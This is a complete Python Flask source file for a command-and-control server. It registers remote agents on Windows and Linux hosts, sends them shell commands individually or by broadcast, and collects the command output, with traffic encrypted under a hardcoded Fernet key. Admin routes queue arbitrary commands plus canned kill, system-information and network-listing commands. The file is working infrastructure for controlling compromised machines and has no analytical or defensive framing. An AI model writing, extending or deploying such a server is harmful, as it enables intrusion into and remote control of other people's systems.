from flask import Flask, request, render_template, jsonify
from cryptography.fernet import Fernet
from datetime import datetime
import sqlite3
import time
import json
import uuid

app = Flask(__name__)

SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)
DB_FILE = 'c2.db'


TARGET_BROADCASTS = {"ALL", "BROADCAST_WINDOWS", "BROADCAST_LINUX"}


def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    try:
        cur.execute(query, args)
        rv = cur.fetchall()
        conn.commit()
        return (rv[0] if rv else None) if one else rv
    finally:
        conn.close()


def init_db():
    query_db(
        '''CREATE TABLE IF NOT EXISTS agents
                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)'''
    )
    query_db(
        '''CREATE TABLE IF NOT EXISTS results
                (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, timestamp TEXT, output TEXT)'''
    )
    query_db(
        '''CREATE TABLE IF NOT EXISTS tasks
                (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)'''
    )
    query_db(
        '''CREATE TABLE IF NOT EXISTS task_receipts
                (task_id INTEGER, hostname TEXT)'''
    )


init_db()


def normalize_os_family(os_name):
    text = (os_name or "").lower()
    if "win" in text:
        return "WINDOWS"
    if "linux" in text or "ubuntu" in text or "debian" in text or "kali" in text:
        return "LINUX"
    if "darwin" in text or "mac" in text or "os x" in text:
        return "MAC"
    return "UNKNOWN"


def parse_status(last_seen, now):
    try:
        last_dt = datetime.combine(now.date(), datetime.strptime(last_seen, '%H:%M:%S').time())
        return "ONLINE" if (now - last_dt).total_seconds() < 45 else "OFFLINE"
    except ValueError:
        return "UNKNOWN"


@app.route('/')
def dashboard():
    return render_template('index.html')


@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        decrypted_raw = cipher.decrypt(request.data).decode()
        data = json.loads(decrypted_raw)
        host = data.get('hostname', 'unknown')
        os_info = data.get('os', 'Unknown')
        os_family = normalize_os_family(os_info)

        query_db(
            "INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?)",
            (host, request.remote_addr, os_info, time.strftime('%H:%M:%S'), request.headers.get('Host', 'Direct IP')),
        )

        cmd_row = query_db(
            '''
            SELECT * FROM tasks t
            WHERE (t.target_type = 'ALL' OR t.target_type = ? OR t.target_type = ?)
            AND NOT EXISTS (SELECT 1 FROM task_receipts r WHERE r.task_id = t.id AND r.hostname = ?)
            ORDER BY t.id ASC LIMIT 1''',
            (f"BROADCAST_{os_family}", host, host),
            one=True,
        )

        cmd = "none"
        if cmd_row:
            cmd = cmd_row['command']
            query_db("INSERT INTO task_receipts (task_id, hostname) VALUES (?, ?)", (cmd_row['id'], host))

        return cipher.encrypt(cmd.encode())
    except Exception:
        return "Error", 400


@app.route('/api/stats')
def api_stats():
    now = datetime.now()
    agents = [dict(row) for row in query_db("SELECT * FROM agents ORDER BY hostname COLLATE NOCASE ASC")]
    tasks = [dict(row) for row in query_db("SELECT * FROM tasks ORDER BY id DESC")]

    # Filters
    agent_search = request.args.get('agent_search', '').strip().lower()
    agent_os = request.args.get('agent_os', 'ALL').upper()
    agent_status_filter = request.args.get('agent_status', 'ALL').upper()

    results_search = request.args.get('results_search', '').strip().lower()
    results_os = request.args.get('results_os', 'ALL').upper()
    results_host = request.args.get('results_host', 'ALL')

    try:
        results_limit = min(max(int(request.args.get('results_limit', 120)), 20), 500)
    except ValueError:
        results_limit = 120

    total_agents = len(agents)
    online_count = 0
    windows_count = 0
    linux_count = 0

    enriched_agents = []
    for a in agents:
        status = parse_status(a.get('last_seen', ''), now)
        os_family = normalize_os_family(a.get('os', ''))

        if status == 'ONLINE':
            online_count += 1
        if os_family == 'WINDOWS':
            windows_count += 1
        elif os_family == 'LINUX':
            linux_count += 1

        a['status'] = status
        a['os_family'] = os_family
        enriched_agents.append(a)

    filtered_agents = []
    for a in enriched_agents:
        if agent_search and agent_search not in a['hostname'].lower() and agent_search not in a['os'].lower():
            continue
        if agent_os != 'ALL' and a['os_family'] != agent_os:
            continue
        if agent_status_filter != 'ALL' and a['status'] != agent_status_filter:
            continue
        filtered_agents.append(a)

    all_results = [dict(row) for row in query_db("SELECT * FROM results ORDER BY timestamp DESC, id DESC LIMIT 500")]
    enriched_results = []
    for r in all_results:
        os_family = normalize_os_family(r.get('os', ''))
        r['os_family'] = os_family
        enriched_results.append(r)

    filtered_results = []
    for r in enriched_results:
        if results_os != 'ALL' and r['os_family'] != results_os:
            continue
        if results_host != 'ALL' and r['hostname'] != results_host:
            continue
        if results_search:
            searchable = f"{r['hostname']} {r['output']} {r.get('os', '')}".lower()
            if results_search not in searchable:
                continue
        filtered_results.append(r)

    filtered_results = filtered_results[:results_limit]

    queue_data = []
    total_windows = sum(1 for a in enriched_agents if a['os_family'] == 'WINDOWS')
    total_linux = sum(1 for a in enriched_agents if a['os_family'] == 'LINUX')

    for t in tasks:
        receipts = [r['hostname'] for r in query_db("SELECT hostname FROM task_receipts WHERE task_id = ?", (t['id'],))]
        target = t['target_type']

        is_complete = False
        if target == "ALL" and len(receipts) >= total_agents and total_agents > 0:
            is_complete = True
        elif target == "BROADCAST_WINDOWS" and len(receipts) >= total_windows and total_windows > 0:
            is_complete = True
        elif target == "BROADCAST_LINUX" and len(receipts) >= total_linux and total_linux > 0:
            is_complete = True
        elif target not in TARGET_BROADCASTS and len(receipts) > 0:
            is_complete = True

        if not is_complete:
            queue_data.append(
                {
                    "target": target,
                    "command": t['command'],
                    "timestamp": t.get('timestamp') or "--:--:--",
                    "seen_list": receipts,
                }
            )

    queue_data = queue_data[:200]

    host_options = [a['hostname'] for a in enriched_agents]

    return jsonify(
        {
            "agents": filtered_agents,
            "results": filtered_results,
            "queue": queue_data,
            "total_count": online_count,
            "stats": {
                "total_agents": total_agents,
                "online_agents": online_count,
                "windows_agents": windows_count,
                "linux_agents": linux_count,
                "offline_agents": max(total_agents - online_count, 0),
            },
            "filters": {
                "result_hosts": host_options,
            },
        }
    )


@app.route('/result', methods=['POST'])
def get_result():
    try:
        decrypted_output = cipher.decrypt(request.data).decode()
        if '|' not in decrypted_output:
            return "Format Error", 400

        host, output = decrypted_output.split('|', 1)

        agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
        if agent:
            os_type = agent['os']
        else:
            os_type = "Unknown"

        query_db(
            "INSERT INTO results (id, hostname, os, timestamp, output) VALUES (?, ?, ?, ?, ?)",
            (str(uuid.uuid4())[:8], host, os_type, time.strftime('%H:%M:%S'), output),
        )
        return "OK", 200
    except Exception as e:
        print(f"Result Error: {e}")
        return "Error", 400


@app.route('/admin/send_cmd', methods=['POST'])
def send_command():
    target = request.form.get('target')
    command = request.form.get('command')

    if not target or not command:
        return "Missing fields", 400

    query_db(
        "INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
        (target, command.strip(), time.strftime('%H:%M:%S')),
    )
    return "OK", 200


@app.route('/admin/purge_tasks', methods=['POST'])
def purge_tasks():
    query_db("DELETE FROM tasks")
    query_db("DELETE FROM task_receipts")
    return "OK", 200


@app.route('/admin/action', methods=['POST'])
def agent_action():
    hostname = request.form.get('hostname')
    action = request.form.get('action')

    agent = query_db("SELECT os FROM agents WHERE hostname = ?", (hostname,), one=True)
    if not agent:
        return "Agent not found", 404

    is_windows = normalize_os_family(agent['os']) == "WINDOWS"

    commands = {
        "kill": "taskkill /F /IM python.exe" if is_windows else "pkill -f agent.py",
        "sysinfo": "Get-ComputerInfo | Select-Object OSName, OSVersion" if is_windows else "uname -a; cat /etc/os-release",
        "netstat": "Get-NetTCPConnection | Select-Object LocalAddress, RemoteAddress, State" if is_windows else "ss -tulpn",
    }

    cmd = commands.get(action)
    if cmd:
        query_db(
            "INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
            (hostname, cmd, time.strftime('%H:%M:%S')),
        )
        return jsonify({"status": "Tasked"}), 200
    return "Invalid Action", 400


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)